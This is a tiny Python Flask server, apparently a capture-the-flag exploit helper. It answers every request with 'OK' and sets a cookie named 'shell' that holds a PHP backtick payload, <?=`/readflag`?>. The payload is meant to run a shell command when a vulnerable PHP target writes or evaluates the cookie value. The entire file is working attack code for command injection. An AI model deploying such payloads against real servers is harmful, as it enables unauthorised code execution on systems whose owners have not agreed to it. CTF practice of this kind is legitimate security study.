from flask import Flask, Response
app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def index():
    resp = Response("OK")
    resp.set_cookie("shell", "<?=`/readflag`?>")
    return resp
if __name__ == '__main__':
    app.run(port=8000, host='0.0.0.0')